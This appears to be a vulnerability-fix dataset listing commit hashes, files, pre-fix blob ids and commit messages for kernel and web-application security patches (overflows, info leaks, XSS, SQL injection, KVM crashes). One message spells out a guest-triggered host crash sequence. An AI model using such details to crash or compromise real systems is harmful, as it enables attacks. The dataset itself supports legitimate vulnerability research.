    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    a54c45ce4a48f0d3a65f6c54ac77bb73a6a41280
Blob(s) Before Fix: 
    0c7c03d50dc0342c7caad25c9d24c3931c50438b
    155eccfa77604fcd63bbeeff1db23ed184082dd6
    3a692d5291636571266c6e26293bc7054228f4e3
    6e3ddf806ec20abcfd4952dfe97d2b521138e055
    dae1949019d7b8dc77d14c39478571e86ad89f34
    e7ceb6c871d1518ddd4cdd61b993a395d01c7d34
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2811ebac2521ceac84f2bdae402455baa6a7fb47:
ipv6: udp packets following an UFO enqueued packet need also be handled by UFO\n\nIn the following scenario the socket is corked: If the first UDP packet is larger then the mtu we try to append it to the write queue via ip6_ufo_append_data. A following packet, which is smaller than the mtu would be appended to the already queued up gso-skb via plain ip6_append_data. This causes random memory corruptions.\n\nIn ip6_ufo_append_data we also have to be careful to not queue up the same skb multiple times. So setup the gso frame only when no first skb is available.\n\nThis also fixes a shortcoming where we add the current packet's length to cork->length but return early because of a packet > mtu with dontfrag set (instead of sutracting it again).\n\nFound with trinity.\n\nCc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3dad4f8e3214d6ab5f71823019a624fa48b055a3
File(s) In Commit: 
    src/lib/Gitolite/Rc.pm
Blob(s) In Commit: 
    75ff21af8aa22ea56bcf4ded5427ad42264ec35d
Blob(s) Before Fix: 
    5e1f21e7af6adb5259b4b00b8e0174e6b93c30e3
    b327637c3beecfae75c193706a7aa8db1d4504ed
Projects:
    1060460048_gitolite
Commit Message for 3dad4f8e3214d6ab5f71823019a624fa48b055a3:
oops  fa06a34 had a nasty bug for fresh installs\n\nthanks to Nathan Ferch for catching this.  See thread with subject line "World writable files and directories" on the mailing list.

======================================================================
Commit With Fix: 
    0002d106a6cd35cb0a6fe03246531a4e3f32c9d0
File(s) In Commit: 
    account_sponsor_page.php
Blob(s) In Commit: 
    67c12d328fac43552cbc7155e77f33d09000ff1a
Blob(s) Before Fix: 
    8aa3a66223a325c5be3f9234f0b2b9e486d22816
Projects:
    01-Scripts_mantisbt
Commit Message for 0002d106a6cd35cb0a6fe03246531a4e3f32c9d0:
Fix #16513: XSS in account_sponsor_page.php project names\n\naccount_sponsor_page.php.php does not correctly sanitise project names. It is thus possible for a malicious user with project manager access permissions (or higher) to let users execute malicious JavaScript when visiting account_sponsor_page.php.

======================================================================
Commit With Fix: 
    ca0302e0c716682d2de22e9136400c704cc93e42
File(s) In Commit: 
    lib/sup/message_chunks.rb
Blob(s) In Commit: 
    8cacfc4abf348ce7634ee70d4367013d9b5550c6
Blob(s) Before Fix: 
    6abaea24303b5d1cc9798094077de5dd98e50b74
    cf671defe3c4b1fdbe34c43a1cd0958f19bfd3dd
Projects:
    0xACE_sup
Commit Message for ca0302e0c716682d2de22e9136400c704cc93e42:
security: prevent remote command injection in content_type

======================================================================
Commit With Fix: 
    6aae0a9f145f536515e268dd6b25aa740a5edfe7
File(s) In Commit: 
    engine/engine.py
Blob(s) In Commit: 
    be66738c0b22b9dcbf50e81123629d20a87036de
Blob(s) Before Fix: 
    a42f642385572e075393e916daca7db6e704ccfc
Projects:
    Abioy_ibus
Commit Message for 6aae0a9f145f536515e268dd6b25aa740a5edfe7:
Added to check the input purpose for gnome-shell password dialog.

======================================================================
Commit With Fix: 
    201f99f170df14ba52ea4c52847779042b7a623b
File(s) In Commit: 
    arch/um/kernel/exitcode.c
Blob(s) In Commit: 
    41ebbfebb3332f2bc7269a754ff96b377e17212b
Blob(s) Before Fix: 
    0ea87f24b36fdefe558d8486baf41f4849ad3661
    3431270083b0247f40a02b0f8eb6ba570a193e5a
    546302e3b7fbf0db7fef2faf9e5b77695f312c3e
    829df49dee99c6093d5586d0e2c19e34786dfa97
    94fe8708a7c3615f254e5ff64685098461837bc0
    ce057afb6218347973bf4c6edeb48fc46b7f224d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 201f99f170df14ba52ea4c52847779042b7a623b:
uml: check length in exitcode_proc_write()\n\nWe don't cap the size of buffer from the user so we could write past the end of the array here.  Only root can write to this file.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c2c65cd2e14ada6de44cb527e7f1990bede24e15
File(s) In Commit: 
    drivers/staging/ozwpan/ozcdev.c
Blob(s) In Commit: 
    6ce0af9977d8c0ccc053e98eb818a98ec8d990f7
Blob(s) Before Fix: 
    1c380d6879639a90b0d5d3b251538342888eebda
    224ccff75d4fc1dd1faf979bd03e8d55ae21022a
    27325f74ecdc3dd4faf0110a36d993ed09f98365
    27d06666c81ab4ce12aab8b15ddf79884ee72e3e
    374fdc398641a035733a34dbf83d8ca1e6f387f9
    64913aeb0bacceae794a8553fe1178d4c4efa755
    6ccb64fb07865821741d9c3406377bf97cfe7994
    ba15aeb70672bbe46f91011c1fc296566b7aef95
    ea5f9f3595fd065c72c7edb92a8bc0c4d5309941
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c2c65cd2e14ada6de44cb527e7f1990bede24e15:
staging: ozwpan: prevent overflow in oz_cdev_write()\n\nWe need to check "count" so we don't overflow the ei->data buffer.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    b5e2f339865fb443107e5b10603e53bbc92dc054
File(s) In Commit: 
    drivers/staging/wlags49_h2/wl_priv.c
Blob(s) In Commit: 
    7e10dcdc3090085460918be8dfa9261df14eaa13
Blob(s) Before Fix: 
    260d4f0d47b427a8506835752fe94f9c4713f40f
    7e0e6876a335b4db1265bd86acb19188dd5abed1
    87e1e412312674567ad2a2c0e4cdfa7a46bdbb6a
    c97e0e154d285d8b638dc5adb7a1bd4ac764d586
    f30e5ee4bca33bffe4c14deb156fd1723be00ee8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b5e2f339865fb443107e5b10603e53bbc92dc054:
staging: wlags49_h2: buffer overflow setting station name\n\nWe need to check the length parameter before doing the memcpy().  I've actually changed it to strlcpy() as well so that it's NUL terminated.\n\nYou need CAP_NET_ADMIN to trigger these so it's not the end of the world.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    8d1e72250c847fa96498ec029891de4dc638a5ba
File(s) In Commit: 
    drivers/staging/bcm/Bcmchar.c
Blob(s) In Commit: 
    639ba96adb36b58e1c21b6ae037f084be512cdfc
Blob(s) Before Fix: 
    2fa658eb74dcda1e40fb1e8115a3d1281cccce30
    35641e529396759d5e7c860457155b28fde21f94
    491e2bfbc46487a51cbb4e62ef71613876b0cddb
    756b6344b1fdc2e52ed4bdef552130abae84afe6
    87b74ca84c42154eac8c8715deea37f5b20aa5ce
    cf3059216958e6cdfe5d7ce589549cc5c223978d
    f67a22536cbf6dc7843b583db8a47295518496c4
    f91bc1fdd895eda2c3e43c2553fef784d15f43c5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8d1e72250c847fa96498ec029891de4dc638a5ba:
Staging: bcm: info leak in ioctl\n\nThe DevInfo.u32Reserved[] array isn't initialized so it leaks kernel information to user space.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    a8b33654b1e3b0c74d4a1fed041c9aae50b3c427
File(s) In Commit: 
    drivers/staging/sb105x/sb_pci_mp.c
Blob(s) In Commit: 
    a10cdb17038bf9717bbb20f979fb104dda9ccb27
Blob(s) Before Fix: 
    23db32f07fd533ac4803b9a0a56815a5a7606eea
    5cd3efff97d3b3a029c328fef330aa05348eff5c
    b90e96b7ca0127eb55860a538fb354cd6f430f65
    cd94f6c2772319bc289ead11aebb1e34c26955ef
    f75ee1dd475c6e1b9ead392a1e43e5ea6177747b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a8b33654b1e3b0c74d4a1fed041c9aae50b3c427:
Staging: sb105x: info leak in mp_get_count()\n\nThe icount.reserved[] array isn't initialized so it leaks stack information to userspace.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    0e033e04c2678dbbe74a46b23fffb7bb918c288e
File(s) In Commit: 
    net/ipv6/udp_offload.c
Blob(s) In Commit: 
    e7359f9eaa8d4dd14b706afc9c7241c85e52d056
Blob(s) Before Fix: 
    06556d6e1a4db3487ff3916007c91f2f55fdb95a
    08e23b0bf302e93c27c74a3cd8dfc5213c453c6e
    0c8934a317c2f72ebdd9ada034812bbd8e261597
    2f65b022627b90481a7738b16c82bf770ed300c8
    34c6fff3ae8483f2eafa8069cc8e8cf4d42dd4ec
    3696aa28784a5a362ecff7e57da6656a1ba93655
    5d1b8d7ac9931c7d0cbe35c06318d08659a5af7b
    60559511bd9c479e7996ff9826c4852e8051df72
    cf05cf073c517d2e0fae4c967acffffa77befcbc
    d3cfaf9c7a0858d8bb1e9fd60c412c3b03cbf3e3
    f50a01147ad7a967f5510a80e717557a11ad6ec5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0e033e04c2678dbbe74a46b23fffb7bb918c288e:
ipv6: fix headroom calculation in udp6_ufo_fragment\n\nCommit 1e2bd517c108816220f262d7954b697af03b5f9c ("udp6: Fix udp fragmentation for tunnel traffic.") changed the calculation if there is enough space to include a fragment header in the skb from a skb->mac_header dervived one to skb_headroom. Because we already peeled off the skb to transport_header this is wrong. Change this back to check if we have enough room before the mac_header.\n\nThis fixes a panic Saran Neti reported. He used the tbf scheduler which skb_gso_segments the skb. The offsets get negative and we panic in memcpy because the skb was erroneously not expanded at the head.\n\nReported-by: Saran Neti <Saran.Neti@telus.com> Cc: Pravin B Shelar <pshelar@nicira.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    338c7dbadd2671189cec7faf64c84d01071b3f96
File(s) In Commit: 
    virt/kvm/kvm_main.c
Blob(s) In Commit: 
    4f588bc941861b10f7d5dccf9305941c8d3cc218
Blob(s) Before Fix: 
    1580dd4ace4eac20b37043c2f5c882349204ed4a
    1cd693a76a510c34a2d563d9fe68072802d28620
    1cf9ccb010131d42c3a573079437d87502ac016f
    302681c4aa4465bb21b69524d7c0d3a5341f4a4e
    662f34c3287e59e8f0707d80b0c88396d402c8c0
    7e140683ff14d503a9714058cadd9dde7e4ffaf9
    8bf05f055c0a50c0ea3d86c5d6ce3c24b1f9a066
    979bff485fb0b343cb5e1fd4328d7cf046dafef7
    a0aa84b5941ac96aabae48b03d80278052ce8929
    a9dd682cf5e3f5117de017156396337a8352914f
    aac732d17c17e4e16eba3f03c8ba725aaaa6e477
    adc68feb5c5a338080ac8ca2385f73577ac6c29a
    bf040c4e02b332b7dd2126ae6ed2013261ecfdb4
    d3cfc5c7a201435a0549635a7c65818878d9e282
    db50f4c3d238f38dee583d70e9e3cb694736a555
    e59bb63cb089634c7d9bed701be0581bf536726a
    e77d3eb2a4f41dafec72e53d0adcdccb5b67398c
    eb99458f5b6841fc7a904e5a44e1dc6af8bec0b4
    f71c4ad425c652cbbb7362fc650904697ad0f6fe
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 338c7dbadd2671189cec7faf64c84d01071b3f96:
KVM: Improve create VCPU parameter (CVE-2013-4587)\n\nIn multiple functions the vcpu_id is used as an offset into a bitfield.  Ag malicious user could specify a vcpu_id greater than 255 in order to set or clear bits in kernel memory.  This could be used to elevate priveges in the kernel.  This patch verifies that the vcpu_id provided is less than 255. The api documentation already specifies that the vcpu_id must be less than max_vcpus, but this is currently not checked.\n\nReported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    04bcef2a83f40c6db24222b27a52892cba39dffb
File(s) In Commit: 
    net/netfilter/ipvs/ip_vs_ctl.c
Blob(s) In Commit: 
    c37ac2d7bec44da042af844717084489aae511a6
Blob(s) Before Fix: 
    02b2610c4d2e88acd378f7305de45f2bd427d3ae
    031df1e73261b70e972f9d2e5329b3da8ea2cdc7
    27a15f56cb693f2e8d77045865f085b57e4656ca
    446e9bd4b4bc2b90aa850f8734ee64ced9f03fe1
    6bde12da2fe0038660f6d3b7b195e8596c289e1e
    7c1333c67ff3d5f810540eea5f774fc6582030dd
    7ee9c3426f44a24b141492b266223b319e8a3f95
    9bcd9725ddef06bb2af07bbdfea880fdc1973a4c
    e01061f49cdc644b0fe99d48457795458f55aa91
    e55a6861d26f76ad7c1276cd6662e13cfda04ff1
    fba2892b99e10157a90bcf73969a61647c390605
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 04bcef2a83f40c6db24222b27a52892cba39dffb:
ipvs: Add boundary check on ioctl arguments\n\nThe ipvs code has a nifty system for doing the size of ioctl command copies  it defines an array with values into which it indexes the cmd to find the right length.\n\nUnfortunately, the ipvs code forgot to check if the cmd was in the range that the array provides, allowing for an index outside of the array, which then gives a "garbage" result into the length, which then gets used for copying into a stack buffer.\n\nFix this by adding sanity checks on these as well as the copy size.\n\n[ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ] Signed-off-by: Arjan van de Ven <arjan@linux.intel.com> Acked-by: Julian Anastasov <ja@ssi.bg> Signed-off-by: Simon Horman <horms@verge.net.au> Signed-off-by: Patrick McHardy <kaber@trash.net>

======================================================================
Commit With Fix: 
    7d3e91a89b7adbc2831334def9e494dd9892f9af
File(s) In Commit: 
    fs/nfs/nfs4proc.c
Blob(s) In Commit: 
    05e5f6f9f2b80b22fa306d33fcdd06c6540725f3
Blob(s) Before Fix: 
    5eec4429970c6e98af7a18732794c6fceaba4951
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7d3e91a89b7adbc2831334def9e494dd9892f9af:
NFSv4: Check for buffer length in __nfs4_get_acl_uncached\n\nCommit 1f1ea6c "NFSv4: Fix buffer overflow checking in __nfs4_get_acl_uncached" accidently dropped the checking for too small result buffer length.\n\nIf someone uses getxattr on "system.nfs4_acl" on an NFSv4 mount supporting ACLs, the ACL has not been cached and the buffer suplied is too short, we still copy the complete ACL, resulting in kernel and user space memory corruption.\n\nSigned-off-by: Sven Wegener <sven.wegener@stealer.net> Cc: stable@kernel.org Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>

======================================================================
Commit With Fix: 
    625c16bb28bb120d262b3f19f89c2c06cb9b0da9
File(s) In Commit: 
    Auth/Yadis/XML.php
Blob(s) In Commit: 
    bb13775618cca7957c77c19b7ac2d2512c46b874
Blob(s) Before Fix: 
    cf1f5c41b28638f32c4126ea651dfbf93dc984f2
Projects:
    38pages_php-openid
Commit Message for 625c16bb28bb120d262b3f19f89c2c06cb9b0da9:
disable external XML entities and libxml errors\n\nthanks to Kousuke Ebihara for the report and patch.

======================================================================
Commit With Fix: 
    45eec046391afabb676b62b9201da0cd530360b4
File(s) In Commit: 
    modules/rss/rss.php
Blob(s) In Commit: 
    f18dfc19dbe34d94fddb8c2c739e6785baa77f25
Blob(s) Before Fix: 
    3854a27fcd6bbcc34d5fa77afe56bf2a4ea05ae9
    f4d56f937298c482cd345d1bbab8f1e551f90a03
Projects:
    1nv4d3r5_Cotonti
Commit Message for 45eec046391afabb676b62b9201da0cd530360b4:
Fixed SQL injection vulnerability in RSS module

======================================================================
Commit With Fix: 
    c5f27bf66a7f35bd3daeb5f693f3e2493f51b1f3
File(s) In Commit: 
    core/inc/bigtree/cms.php
Blob(s) In Commit: 
    66d34d7bd27c2e56644e291d48f68fb31bf1e4e8
Blob(s) Before Fix: 
    ff5867f50b6fbfeeb55222a5f6529df69b2596d3
Projects:
    4v4t4r_BigTree-CMS
Commit Message for c5f27bf66a7f35bd3daeb5f693f3e2493f51b1f3:
Fixed error when putting ' in a URL by accident.

======================================================================
Commit With Fix: 
    8a59c2e13f8e151b6a9e98f73e641e1ec8d928df
File(s) In Commit: 
    core/admin/modules/developer/modules/views/add.php
Blob(s) In Commit: 
    a3dc82539b15162e111c07a1394f0fd80dce2b13
Blob(s) Before Fix: 
    6437dbcc1dc2027d8de5dc8cd3906fabd92c7f4b
Projects:
    4v4t4r_BigTree-CMS
Commit Message for 8a59c2e13f8e151b6a9e98f73e641e1ec8d928df:
Fixed a potential cross-site scripting issue on the module view add page. Thanks to High-Tech Bridge Security Research Lab for finding this and the Cross-Site Request Forgery issues.

======================================================================
Commit With Fix: 
    e8180dcaa8470ceca21109f143876fdcd9fe050a
File(s) In Commit: 
    arch/arm/kvm/arm.c
Blob(s) In Commit: 
    ef1703b9587b0264c5b7ea8ebb246376dfe76326
Blob(s) Before Fix: 
    1d55afe7fd4bd0a8802e1e2efd6c891fa5631c94
    2a700e00528d0a3cc9d78a58f7d38dddf2297611
    37d216d814cdd62d12040666e70192b0a33fe350
    55914aa7b2d741887b9d90f7ca35ac2e703278f4
    5a936988eb24d1e62e5ae248ff6e4a3db59667b9
    741f66a2edbd77bf3ddce5a53c6cb760e491c7fe
    9e193c8a959eaa1492838ae2913548aa7c6a80de
    bd18bb8b2770ced6a65e5b3ad50dd79963d49c3b
    c1fe498983ac84c21334d87b1cd9cd6c8c3abc3f
    ce404a5c30628c72533a62e430c6150a54032fea
    d0c8ee654bbf5c580c128f498c4f13d02797f5e5
    ed5834e8e2ac2ffbc852f1907bf0afe173c52959
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for e8180dcaa8470ceca21109f143876fdcd9fe050a:
ARM: KVM: prevent NULL pointer dereferences with KVM VCPU ioctl\n\nSome ARM KVM VCPU ioctls require the vCPU to be properly initialized with the KVM_ARM_VCPU_INIT ioctl before being used with further requests. KVM_RUN checks whether this initialization has been done, but other ioctls do not. Namely KVM_GET_REG_LIST will dereference an array with index -1 without initialization and thus leads to a kernel oops. Fix this by adding checks before executing the ioctl handlers.\n\n [ Removed superflous comment from static function - Christoffer ]\n\nChanges from v1:  * moved check into a static function with a meaningful name\n\nSigned-off-by: Andre Przywara <andre.przywara@linaro.org> Signed-off-by: Christoffer Dall <cdall@cs.columbia.edu>

======================================================================
Commit With Fix: 
    f8d441cd25172fdfe5b613442fedfc0da3cc333d
File(s) In Commit: 
    apache2/modsecurity.c
Blob(s) In Commit: 
    b36775d223bafbfa8859e81effd5e39d02339b20
Blob(s) Before Fix: 
    6b77132ddb8d9795525c5300ef7bd581d3f81616
Projects:
    0xbin_ModSecurity
Commit Message for f8d441cd25172fdfe5b613442fedfc0da3cc333d:
Fix Chunked string case sensitive issue - CVE-2013-5705

======================================================================
Commit With Fix: 
    284d7402718d98fcf10cee565415939882abab99
File(s) In Commit: 
    master/lib/Munin/Master/HTMLConfig.pm
Blob(s) In Commit: 
    1b013d4d6096e3a8a704f0dc0cd0fa6868d12e10
Blob(s) Before Fix: 
    9a2d185a0a3cde2678381b2652d895b715dea974
Projects:
    AMDmi3_munin
Commit Message for 284d7402718d98fcf10cee565415939882abab99:
master: avoid an endless loop in HTML generation\n\nSafeguard to avoid any bigger loop than 100 nested levels. It protects against application bugs in the parsing code.\n\nThx Christoph Biedl (debian.axhn@manchmal.in-ulm.de) for noticing and for providing a patch\n\nCloses: C:CVE-2013-6048

======================================================================
Commit With Fix: 
    b963a22e6d1a266a67e9eecc88134713fd54775c
File(s) In Commit: 
    arch/x86/kvm/lapic.c
Blob(s) In Commit: 
    89b52ec7d09c5b78bfd3d45759af11637ef43be3
Blob(s) Before Fix: 
    5439117d5c4cccfa00d28dd64fb5aa8fd488261e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b963a22e6d1a266a67e9eecc88134713fd54775c:
KVM: x86: Fix potential divide by 0 in lapic (CVE-2013-6367)\n\nUnder guest controllable circumstances apic_get_tmcct will execute a divide by zero and cause a crash.  If the guest cpuid support tsc deadline timers and performs the following sequence of requests the host will crash. - Set the mode to periodic - Set the TMICT to 0 - Set the mode bits to 11 (neither periodic, nor one shot, nor tsc deadline) - Set the TMICT to non-zero. Then the lapic_timer.period will be 0, but the TMICT will not be.  If the guest then reads from the TMCCT then the host will perform a divide by 0.\n\nThis patch ensures that if the lapic_timer.period is 0, then the division does not occur.\n\nReported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    7d4562d6f7e40de04bbe29577b51c79f07d05ba6
File(s) In Commit: 
    src/main/java/hudson/scm/SubversionSCM.java
Blob(s) In Commit: 
    b591a8de442e0a6738abf94819947c5d13711be7
Blob(s) Before Fix: 
    18fb5a6003440d33c55ce672d55eceb9faea6198
Projects:
    2improveIT_subversion-plugin
Commit Message for 7d4562d6f7e40de04bbe29577b51c79f07d05ba6:
[FIXED SECURITY-58]\n\nencryption of passphrases wasn't sufficiently secure.

======================================================================
Commit With Fix: 
    17d68b763f09a9ce824ae23eb62c9efc57b69271
File(s) In Commit: 
    arch/x86/kvm/lapic.c
Blob(s) In Commit: 
    dec48bfaddb8ff79ee7f7734cebfca7f36844461
Blob(s) Before Fix: 
    02b51dd4e4ad37e4852efa0b40d110121ebbad83
    0eee2c8b64d1cafecdf7f587dbeef5566b4449df
    5439117d5c4cccfa00d28dd64fb5aa8fd488261e
    9392f527f107490b9fc8d036f971994c3823b31d
    afc11245827cf2f39b56d14d50dacd6ea9aeb374
    b8bec45c1610dd5bef338a84d19a15cdc6172aa3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 17d68b763f09a9ce824ae23eb62c9efc57b69271:
KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash. When the guest writes to the ICR to request an IPI, while in x2apic mode the following things happen, the destination is read from ICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the cluster id.  A BUG_ON is triggered, which is a protection against accessing map->logical_map with an out-of-bounds access and manages to avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem is that KVM supports only one cluster with ID 0 in clustered mode, but the code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com> Cc: stable@vger.kernel.org Signed-off-by: Gleb Natapov <gleb@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    a497e47d4aec37aaf8f13509f3ef3d1f6a717d88
File(s) In Commit: 
    drivers/net/wireless/libertas/debugfs.c
Blob(s) In Commit: 
    cc6a0a586f0b748c054c4c0e8631ea0d706501cb
Blob(s) Before Fix: 
    0b48430d6ad067a27788bd3d6bcae419fe3bc205
    1af182778844c04d47e5f070fa853cff0c6c2925
    23250f6217615f9462aac7f73c2329dfa0944973
    26cbf1dcc6620f0502314daf8cac579794c8f6e4
    35d86fae04af121da06ae5530cc6cf4443d274dc
    668dd27616a0c83f9a4a39b94de2ad22b8e98a2b
    893a55ca344a34c73af379cf54f46003aec79788
    89532a608401ac64f8fa347992f0a0a9ed37e54c
    a06cc283e23d1c3df6b645f30ce992875e0a0382
    c192671610fcf5bec8c117c10972e5ab569e9d03
    d8d8f0d0899faaebb5f2efa857267c3259f27612
    db146cd5f6a61358e801a3a8be91e2d82a8f822b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a497e47d4aec37aaf8f13509f3ef3d1f6a717d88:
libertas: potential oops in debugfs\n\nIf we do a zero size allocation then it will oops.  Also we can't be sure the user passes us a NUL terminated string so I've added a terminator.\n\nThis code can only be triggered by root.\n\nReported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Acked-by: Dan Williams <dcbw@redhat.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    b4789b8e6be3151a955ade74872822f30e8cd914
File(s) In Commit: 
    drivers/scsi/aacraid/commctrl.c
Blob(s) In Commit: 
    fbcd48d0bfc3397f2a5b202b093d06bbaa2420a6
Blob(s) Before Fix: 
    05fbc3ded9b5dc3fba8307995d0c0eaffbe82a50
    0bd38da4ada0e7cfc9e112cefdd693b039efc54c
    1254431d3053bc402b4414c024560e409551ca21
    16b2db3cd9f1ecfe70a4afb3e3badbc471aab0de
    1ef041bc60c89c17b9f130124e9e1273995adb11
    54195a117f72e1f29241b1d079eb8de96e0df056
    5648b715fed9c2d4e448c9f477953ecb83e94641
    8a0b33033177174bca1766233ae596ae1f8e3ffa
    d2f8d5954840e739d38b86a023a9651dc89b7fcb
    d6fcadd7de2c79bea49e6cb8665d463ab3381d80
    d85ac1a9d2c0698b85c606ab6b2ff917cb0959ed
    e1daff230c7dab05b794cf44a8675d9cad04fcaa
    ee6caddd978c1b59b83971a8244c001bfa1ff432
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b4789b8e6be3151a955ade74872822f30e8cd914:
aacraid: prevent invalid pointer dereference\n\nIt appears that driver runs into a problem here if fibsize is too small because we allocate user_srbcmd with fibsize size only but later we access it until user_srbcmd->sg.count to copy it over to srbcmd.\n\nIt is not correct to test (fibsize < sizeof(*user_srbcmd)) because this structure already includes one sg element and this is not needed for commands without data.  So, we would recommend to add the following (instead of test for fibsize == 0).\n\nSigned-off-by: Mahesh Rajashekhara <Mahesh.Rajashekhara@pmcs.com> Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    6fb392b1a63ae36c31f62bc3fc8630b49d602b62
File(s) In Commit: 
    drivers/s390/net/qeth_core_main.c
Blob(s) In Commit: 
    bd8c09e7a8d9f519928be75819255cfe05bab2b7
Blob(s) Before Fix: 
    0a328d0d11bebaac40ccbaf2239ca999dd736373
    438f1c86ac902d3a25313145ad58096288f6e417
    4fae1dc19951306a25ffa437e43d95f3f4dba72a
    6cd0fc1b203a2c6e8147dc37d980933ff9b7e89f
    8334dadc681de98eeb7ac78fed5755336ff58d63
    e06cb8f8d0c2f778ccb88d9cf2a9e95b9e075605
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6fb392b1a63ae36c31f62bc3fc8630b49d602b62:
qeth: avoid buffer overflow in snmp ioctl\n\nCheck user-defined length in snmp ioctl request and allow request only if it fits into a qeth command buffer.\n\nSigned-off-by: Ursula Braun <ursula.braun@de.ibm.com> Signed-off-by: Frank Blaschka <frank.blaschka@de.ibm.com> Reviewed-by: Heiko Carstens <heicars2@linux.vnet.ibm.com> Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Cc: <stable@vger.kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    f856567b930dfcdbc3323261bf77240ccdde01f5
File(s) In Commit: 
    drivers/scsi/aacraid/linit.c
Blob(s) In Commit: 
    f0d432c139d0cecedf51295562c858d22a9f44f0
Blob(s) Before Fix: 
    0d279c445a30c3ceb92d8e00dbd7cbcf190f2cc6
    408a42ef787a32b6d8fece98c717376ce93c1270
    4921ed19a027f819b731271c4804be74d2426e5a
    705e13e470af18850ae4375533ae4f85495b592c
    c7b6fed887350828b0d0ccd6678eb855c06f37bf
    e9313f85bc706cea1aee8baf15eb966be535c128
    fdbbf4c90be4fe6b1396ef18761364fd2f3e55ae
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f856567b930dfcdbc3323261bf77240ccdde01f5:
aacraid: missing capable() check in compat ioctl\n\nIn commit d496f94d22d1 ('[SCSI] aacraid: fix security weakness') we added a check on CAP_SYS_RAWIO to the ioctl.  The compat ioctls need the check as well.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2
File(s) In Commit: 
    net/ipv6/ip6_fib.c
Blob(s) In Commit: 
    5bec666aba61d464fab4e77684eedd4265143cf9
Blob(s) Before Fix: 
    13690d650c3e227de6579ed6ee489fbff1cbddef
    192dd1a0e18810f01923b43ef5f4a75c5b5d8d35
    5550a8113a6dc5f202c0ccda2c7166e98e81a7e9
    5e30677953d72c81a63ef065377318f7f0806a53
    5fc9c7a68d8d102aef37b7b13ab1dd772553a9cb
